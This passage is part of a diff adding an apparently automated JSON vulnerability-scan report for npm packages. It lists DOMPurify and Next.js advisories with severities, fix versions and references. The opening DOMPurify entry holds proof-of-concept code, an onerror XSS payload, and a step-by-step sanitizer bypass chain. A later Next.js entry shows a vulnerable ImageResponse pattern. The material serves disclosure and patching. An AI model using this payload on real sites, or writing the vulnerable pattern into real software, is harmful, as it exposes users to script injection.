window.document.createElement('div');\nroot.id = 'root';\nroot.innerHTML = '\u003csection id=\"wrap\"\u003e\u003cimg src=\"x\" onerror=\"ATTACKER()\"\u003e\u003c/section\u003e';\nwindow.document.body.appendChild(root);\n\nDOMPurify.addHook('afterSanitizeElements', (node) =\u003e {\n  if (node.id === 'wrap') node.remove();\n});\nDOMPurify.sanitize(root, { IN_PLACE: true });\n\n// The detached \u003cimg\u003e still carries its onerror handler:\nconsole.log(root.querySelector('#wrap') === null,               // true (removed from live tree)\n            !!window.document.querySelector('img[onerror]') ||  // handler survives on the detached node\n            root.innerHTML);\n```\n\n```text\nPASS: beforeSanitizeElements detach neutralizes descendant onerror (control)\nPASS: uponSanitizeElement detach neutralizes descendant onerror (control)\nPASS: without a removal hook the descendant onerror is stripped normally\nPASS: afterSanitizeElements detach LEAVES descendant onerror armed (GAP)\nPASS: afterSanitizeAttributes detach LEAVES descendant onerror armed (GAP)\nPASS: kept custom element removed in afterSanitizeElements leaves descendant onerror armed (GAP)\n```\n\n## Attack Chain\n\n1. **Exposure:** The victim application calls `DOMPurify.sanitize(liveNode, { IN_PLACE: true })` on attacker-influenced markup and has registered a node-removing `afterSanitizeElements` or `afterSanitizeAttributes` hook per an application policy (`src/purify.ts:3026` walk, `2136` element pass, `2522` attribute pass).\n2. **Control:** The attacker controls the markup, including a non-root wrapper element and, inside it, a descendant carrying an `on*` resource-event handler such as `\u003cimg src=x onerror=...\u003e`.\n3. **Path:** The pre-order walk visits the wrapper before its descendants. During the wrapper's element or attribute pass the application hook detaches the wrapper from the live tree.\n4. **Guard:** The detach-neutralization guard `_handleHookDetachedNode` runs only after `beforeSanitizeElements` (`2142`) and `uponSanitizeElement` (`2175`); it is absent after `afterSanitizeElements` (`2208`, `2249`) and is never called by `_sanitizeAttributes` (afterSanitizeAttributes at `2670`). The NodeIterator advances past the detached subtree, so the descendants are never revisited, and the post-walk pass iterates only `DOMPurify.removed`, which excludes hook-detached nodes.\n5. **Primitive:** The descendant retains its `on*` handler on the caller's live document after `sanitize()` returns.\n6. **Result:** The queued resource event fires the attacker handler in the victim page origin, achieving DOM XSS despite `IN_PLACE` sanitization.\n\n## Bypass Evidence\n\nThe relevant prior fix is GHSA-55q2-fjhq-7xh7 (\"IN_PLACE hook removal leaves a detached subtree executable, causing XSS\"), whose change (`#1557`) added `_neutralizeSubtree` at the `beforeSanitizeElements` and `uponSanitizeElement` detach sites. Inspection of that change shows it touches no afterSanitize site: the diff adds the neutralization only at the before/upon locations, later refactored into `_handleHookDetachedNode` at `src/purify.ts:2142` and `2175`. A subsequent hardening change (`#1616`) added a `rootWasRemoved` throw and a neutralization sweep over `DOMPurify.removed`, but that sweep still iterates only `DOMPurify.removed`, which by design excludes hook-detached non-root nodes, so it does not close this gap. The `afterSanitizeElements`-on-kept-custom-element site at `2208` was itself introduced by the fix for GHSA-c2j3-45gr-mqc4 (`#1527`), adding another uncovered hook site.\n\nDisproof attempts, all failed: (a) that a later release closed the afterSanitize gap, refuted by inspecting the published 3.4.13, 3.4.14, and 3.4.15 artifacts; (b) that detached descendants are revisited or re-sanitized, refuted at runtime (the `onerror` is retained only at the afterSanitize sites and stripped at the before/upon sites and with no removal hook); (c) that the post-walk pass catches hook-detached nodes, refuted by the design that excludes them from `DOMPurify.removed`; (d) that the precondition is contrived, refuted by parity with the accepted GHSA-55q2 threat model and the library's own supported pattern of removing a node inside `afterSanitizeElements`. The only edge not directly executed is the browser resource-event dispatch (jsdom performs no real image load); it is established by the proven retention of the live handler after a synchronous return, the library's own comments describing exactly this hazard, and parity with the accepted GHSA-55q2 mechanism.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: dompurify`\n- `Confirmed affected range: \u003e= 3.4.13, \u003c= 3.4.15`\n- `Latest release checked: 3.4.15 (npm registry)`\n- `Fix status: fixed in 3.4.16`\n\nThe before/upon detach neutralization introduced for GHSA-55q2-fjhq-7xh7 first shipped in 3.4.13; the residual afterSanitize gap was verified by reproducing it against the published npm artifacts for 3.4.13, 3.4.14, and 3.4.15. The 3.4.12 artifact predates that neutralization and behaves differently at the before/upon sites, so it is outside this specific incomplete-fix range. No release through 3.4.15 neutralizes detached subtrees at the afterSanitize sites, so no fixed version is established.\n\n## Suggested Fix\n\nEnforce the same `IN_PLACE` detach-neutralization invariant at every hook site that can detach a node, not only the before/upon sites. Concretely, apply a `_handleHookDetachedNode(currentNode, root)` re-check after `afterSanitizeElements` at both `src/purify.ts:2208` and `2249` (returning as removed when the node was detached), and add an equivalent `IN_PLACE` detach check plus `_neutralizeSubtree` after `afterSanitizeAttributes` at `2670`. As an interim mitigation without a code change, applications using `IN_PLACE` can avoid removing nodes inside `afterSanitizeElements`/`afterSanitizeAttributes` hooks and instead perform such removals in `beforeSanitizeElements`/`uponSanitizeElement`, or avoid `IN_PLACE` for attacker-influenced content.\n\nReported by zx (GitHub: @manus-pi).",
+          "Severity": "LOW",
+          "VendorSeverity": {
+            "ghsa": 1
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 2.3
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-p98j-92pf-mc4p",
+            "https://github.com/advisories/GHSA-p98j-92pf-mc4p",
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/commit/b9b9d80f7e401771c2ccaef5f45def7eec8f27d7",
+            "https://github.com/cure53/DOMPurify/pull/1636",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.16",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-p98j-92pf-mc4p"
+          ],
+          "PublishedDate": "2026-09-30T15:37:57Z",
+          "LastModifiedDate": "2026-09-30T15:37:57Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-75604",
+          "VendorIDs": [
+            "GHSA-p293-qw3h-jr36"
+          ],
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "15.5.24, 16.3.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-75604",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:e59187b487dd892f88a0bc6225376a3faa15cffee3f478bf395bfd5a23832d1d",
+          "Title": "next: Next.js: Unauthenticated Remote Code Execution on windows-hosted servers",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 13.4.0 until 15.5.24 and 16.3.3, Next.js applications using Pages Router or App Router without Cache Components on Windows-hosted servers do not consistently escape backslashes in route segments before constructing incremental-cache paths. In packages/next/src/shared/lib/router/utils/escape-path-delimiters.ts and packages/next/src/server/lib/incremental-cache/file-system-cache.ts, a remote request can supply encoded Windows path separators that traverse outside the intended cache root and expose private build data, including the server-reference-manifest encryption key. Disclosure of that key can enable remote code execution in the affected application. This issue is fixed in versions 15.5.24 and 16.3.3.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-22"
+          ],
+          "VendorSeverity": {
+            "ghsa": 4,
+            "redhat": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 9.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-75604",
+            "https://advisory.echohq.com/cve/CVE-2026-75604",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/968b9fcb26bdeb8e0a861a9df05361474666d51b",
+            "https://github.com/vercel/next.js/commit/b0f3460a92b955d3ca41fccff9a525a2b910fbf3",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.24",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.3",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-p293-qw3h-jr36",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-75604",
+            "https://www.cve.org/CVERecord?id=CVE-2026-75604"
+          ],
+          "PublishedDate": "2026-09-01T22:17:12.697Z",
+          "LastModifiedDate": "2026-09-09T21:09:13.08Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-2464-fhr4-w9xw",
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "15.5.28, 16.4.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-2464-fhr4-w9xw",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:21ad5f2426a01e6f6cb8ab9831d2a9da7867f1165ebf46eb94b42f2d81ac8b0e",
+          "Title": "Next.js: Unauthenticated Remote Code Execution in Image Optimization API when SVG files are used",
+          "Description": "## Impact\n\nA memory-related vulnerability has been discovered in an upstream library used for Image Optimization can lead to possible remote code execution (RCE) when Next.js runs on glibc-based Linux.\n\n## Workaround\n\nEnsure the version of `sharp` used by Next.js is greater than or equal to `0.35.5`. Fresh installs automatically get a fixed version of `sharp`.\nUpgrading Next.js to the patched versions will ensure package managers automatically provide a fixed version of `sharp` to Next.js.",
+          "Severity": "CRITICAL",
+          "VendorSeverity": {
+            "ghsa": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+              "V40Score": 9.5
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-2464-fhr4-w9xw",
+            "https://github.com/advisories/GHSA-2464-fhr4-w9xw",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/5e3b687b5edb868b064bdc058d768a7021e7f6ad",
+            "https://github.com/vercel/next.js/commit/9571ec899f063df6533351bec390ccb2cc0af6a3",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.28",
+            "https://github.com/vercel/next.js/releases/tag/v16.4.1",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-2464-fhr4-w9xw",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-96889"
+          ],
+          "PublishedDate": "2026-10-22T15:52:53Z",
+          "LastModifiedDate": "2026-10-22T15:52:53Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-2xp9-vwfh-vxw4",
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "15.5.24, 16.3.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-2xp9-vwfh-vxw4",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:677f4d0cebdcc092934ac6fe4200867f069576867f71ead0cd916da6c7da49cf",
+          "Title": "Next.js: Unauthenticated Remote Code Execution in Image Optimization API when AVIF files are used",
+          "Description": "A vulnerability in the underlying `libheif` library used by `sharp` which Next.js uses for image optimization can lead to remote code execution when AVIF files are optimized.\n\nUntil a fix has propagated, optimization of AVIF files is disabled.",
+          "Severity": "CRITICAL",
+          "VendorSeverity": {
+            "ghsa": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+              "V40Score": 9.5
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-2xp9-vwfh-vxw4",
+            "https://github.com/advisories/GHSA-2xp9-vwfh-vxw4",
+            "https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/3a15b4ac6ac8e70b1a9b18ecc18e8434462899b3",
+            "https://github.com/vercel/next.js/commit/409772ec807def20132d251ad48fd8d8ad4c73c2",
+            "https://github.com/vercel/next.js/commit/7a5937a8ab20b89d0a961f75eabb11577f5d5998",
+            "https://github.com/vercel/next.js/pull/97875",
+            "https://github.com/vercel/next.js/pull/97931",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.24",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.3",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-2xp9-vwfh-vxw4"
+          ],
+          "PublishedDate": "2026-09-08T21:21:12Z",
+          "LastModifiedDate": "2026-09-08T21:21:12Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-673q-mjm6-r5xr",
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "16.4.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-673q-mjm6-r5xr",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:40cf2a76828fd95e9e24c35ddc5cc20999fe959c83179f93e674242e250c890f",
+          "Title": "Next.js: Unauthenticated Remote Code Execution in `use cache` functions returning typed arrays",
+          "Description": "## Impact\n\nA vulnerability in applications using App router with Cache Component can lead to remote code execution. The application needs to have a `use cache` function that returns multiple typed arrays.\n\n## Workaround\n\nThere is no known workaround for affected applications with such `use cache` functions. You should upgrade immediately even if your application does not have similar functions.",
+          "Severity": "CRITICAL",
+          "VendorSeverity": {
+            "ghsa": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:N",
+              "V40Score": 9.5
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-673q-mjm6-r5xr",
+            "https://github.com/advisories/GHSA-673q-mjm6-r5xr",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/a4cea6aec5da89d116b8960e113189cf51745d2f",
+            "https://github.com/vercel/next.js/releases/tag/v16.4.1",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-673q-mjm6-r5xr"
+          ],
+          "PublishedDate": "2026-10-22T16:42:31Z",
+          "LastModifiedDate": "2026-10-22T16:42:32Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-vcvr-r3jv-pc5j",
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "16.3.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-vcvr-r3jv-pc5j",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:a9d3754d0ba75058354cc3b3929744b654f3053ed85f2cf405f195cf6cec92f0",
+          "Title": "Next.js: Remote Code Execution in next/og ImageResponse",
+          "Description": "## Impact\n\nThe Node.js `ImageResponse` implementation from `next/og` is affected by an upstream vulnerability. This can lead to remote code execution.\n\nAffected applications pass attacker-controlled values into SVG content, attributes, or styles during image generation:\n\n```tsx\nimport { ImageResponse } from 'next/og'\n\nexport async function GET(request: Request) {\n  const value = new URL(request.url).searchParams.get('value') ?? ''\n\n  return new ImageResponse(\n    \u003csvg width=\"1200\" height=\"630\"\u003e\n      \u003ctitle\u003e{value}\u003c/title\u003e\n    \u003c/svg\u003e\n  )\n}\n```\n\nApplications using the Edge `ImageResponse` implementation, or applications that do not pass attacker-controlled values into SVG content, attributes, or styles, are not affected.\n\n## Workaround\n\nIf upgrading is not immediately possible, do not pass attacker-controlled values into SVG content, attributes, or styles rendered by the Node.js `ImageResponse` implementation from `next/og`.",
+          "Severity": "CRITICAL",
+          "VendorSeverity": {
+            "ghsa": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+              "V40Score": 9.5
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-vcvr-r3jv-pc5j",
+            "https://github.com/advisories/GHSA-vcvr-r3jv-pc5j",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/868fad38690d72088868f299fa2bef339b26838e",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.6",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-vcvr-r3jv-pc5j",
+            "https://github.com/vercel/satori/security/advisories/GHSA-wx4j-mvgx-mqwp"
+          ],
+          "PublishedDate": "2026-09-30T14:48:30Z",
+          "LastModifiedDate": "2026-09-30T14:48:30Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-94482",
+          "VendorIDs": [
+            "GHSA-p3m5-59mp-jv5r"
+          ],
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "15.5.28, 16.4.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-94482",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:fd2ce46375492d5384bc97085029545541b8357805b631f39abf1ead3cde1481",
+          "Title": "next: Next.js: Denial of Service via crafted requests targeting Server Actions",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 13.0.0 until 15.5.28 and 16.4.1, crafted requests targeting App Router applications with at least one Server Action can cause excessive CPU consumption and block processing of further requests in the same process. Applications using the Pages Router and App Router applications without Server Actions are not affected. This issue is fixed in versions 15.5.28 and 16.4.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.2
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-94482",
+            "https://advisory.echohq.com/cve/CVE-2026-94482",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.28",
+            "https://github.com/vercel/next.js/releases/tag/v16.4.1",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-p3m5-59mp-jv5r",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-94482",
+            "https://www.cve.org/CVERecord?id=CVE-2026-94482"
+          ],
+          "PublishedDate": "2026-10-22T16:19:16.72Z",
+          "LastModifiedDate": "2026-10-22T17:29:28.47Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-94483",
+          "VendorIDs": [
+            "GHSA-cjq9-62q9-8jv4"
+          ],
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "16.3.8",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-94483",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:5b0850e6262be568a7e77f7b0b5b72b356b7b1b6da24b048c205f4daa7c7fcae",
+          "Title": "next: Next.js: Information disclosure via SSRF in Image Optimization",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 16.0.0 until 16.3.8, Image Optimization can follow attacker-controlled DNS resolution for a remote URL that matches images.remotePatterns, allowing the optimized image fetch to reach private IP addresses after the URL passes the allow-list check. Applications without images.remotePatterns are not affected. Administrators unable to upgrade should audit allow-listed hosts and avoid entries whose DNS records are not trusted. This issue is fixed in version 16.3.8.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 2,
+            "redhat": 1
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 6.5,
+              "V40Score": 8.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 6.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "V3Score": 3.7
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-94483",
+            "https://advisory.echohq.com/cve/CVE-2026-94483",
+            "https://github.com/advisories/GHSA-cjq9-62q9-8jv4",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/e002ad68bd676bb0ed0c87bb22e3590304763e0b",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.8",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-cjq9-62q9-8jv4",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-94483",
+            "https://www.cve.org/CVERecord?id=CVE-2026-94483"
+          ],
+          "PublishedDate": "2026-10-02T16:16:51.473Z",
+          "LastModifiedDate": "2026-10-06T17:17:27.837Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-103004",
+          "VendorIDs": [
+            "GHSA-h694-7cp9-m8p3"
+          ],
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "16.3.8",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-103004",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:dd24e5330aef31ace244a0b253e89c4ea2158f26994606f42bb294977f9de7a1",
+          "Title": "next: Next.js: Information disclosure via cache key omission in nested cache handlers",
+          "Description": "Next.js versions from 16.3.0 to 16.3.7 warm `use cache` handlers using `next/root-params` and can leak their return value to pages with different root params. With Cache Components enabled (cacheComponents: true), a 'use cache' function that calls another 'use cache' function that reads a root param can be keyed incorrectly when the inner call is served from an existing entry: the enclosing function's cache key then omits that root param. The enclosing entry is written once and reused for all root param values, so a response for one root param value can serve content produced for a different value — whether the page is prerendered at build time or at runtime, or rendered dynamically. Shared cache headers let downstream caches redistribute the content further.\n\nWhat values are leaked cannot be attacker controlled. Which value's content is served depends only on which invocation wrote the entry first.\n\nThis has been patched in 16.3.8.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-524"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 2,
+            "redhat": 1
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 6.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "V3Score": 5.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "V3Score": 3.7
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-103004",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/e92db4536a7f34ae2dbda583cfa1b4e0d06d1865",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.8",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-h694-7cp9-m8p3",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-103004",
+            "https://www.cve.org/CVERecord?id=CVE-2026-103004"
+          ],
+          "PublishedDate": "2026-10-01T15:17:25.877Z",
+          "LastModifiedDate": "2026-10-05T15:01:42.313Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-94484",
+          "VendorIDs": [
+            "GHSA-mcj8-r9mp-w47p"
+          ],
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "16.3.8, 15.5.27",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-94484",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:58bb59199a49cffaeaee283ad8d85147e403a435a901a415493518134cc936b3",
+          "Title": "next: Next.js: Denial of Service via response cache poisoning",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 15.0.0 until 15.5.27 and 16.3.8, applications with a root-level catch-all page and statically generated or Incremental Static Regeneration routes can use a shared response cache key that is insufficiently scoped to the source route. A single unauthenticated crafted request can poison that cache, causing cross-user content substitution or persistent denial of service until the poisoned entry is revalidated or replaced. This issue is fixed in versions 15.5.27 and 16.3.8.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-524"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+              "V3Score": 4.8,
+              "V40Score": 6.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
+              "V3Score": 4.8
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-94484",
+            "https://advisory.echohq.com/cve/CVE-2026-94484",
+            "https://github.com/advisories/GHSA-mcj8-r9mp-w47p",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/52c94abdd2ea5f416f5e8353ea8a2edd3fe311b8",
+            "https://github.com/vercel/next.js/commit/719e4c67d6e92df60246f95e1d96e2dd60789a52",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.27",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.8",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-mcj8-r9mp-w47p",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-94484",
+            "https://www.cve.org/CVERecord?id=CVE-2026-94484"
+          ],
+          "PublishedDate": "2026-10-02T16:16:51.627Z",
+          "LastModifiedDate": "2026-10-05T20:17:28.907Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-94485",
+          "VendorIDs": [
+            "GHSA-f87g-xv8r-7p7x"
+          ],
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "16.3.8",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-94485",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
